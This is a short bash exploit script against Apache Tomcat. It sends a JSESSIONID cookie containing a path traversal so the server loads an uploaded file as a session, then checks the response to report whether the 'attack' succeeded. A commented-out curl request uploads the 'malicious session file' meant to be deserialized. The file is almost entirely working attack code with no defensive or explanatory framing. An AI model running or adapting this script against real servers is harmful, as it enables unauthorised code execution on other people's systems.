#!/bin/bash

#portandsite=':8080/index.jsp'
onlyport=':8080/'
# upload malicious session file
#curl -i -s -k -X $'POST' \
    #-H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywmoea7rgA53GoXAN' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
    #--data-binary $'------WebKitFormBoundarywmoea7rgA53GoXAN\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"groovy.session\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0asdlkf\x0a\x0d\x0a------WebKitFormBoundarywmoea7rgA53GoXAN--\x0d\x0a' $1$onlyport
#curl "$1$onlyport" -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/upload-dir/groovy' 
response=$(curl "$1$onlyport" -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/upload-dir/executePayload' | grep PersistentManagerBase )
if [ -z "$response" ]
then 
    echo "Attack failed."
else
    echo "Attack was successful."
fi



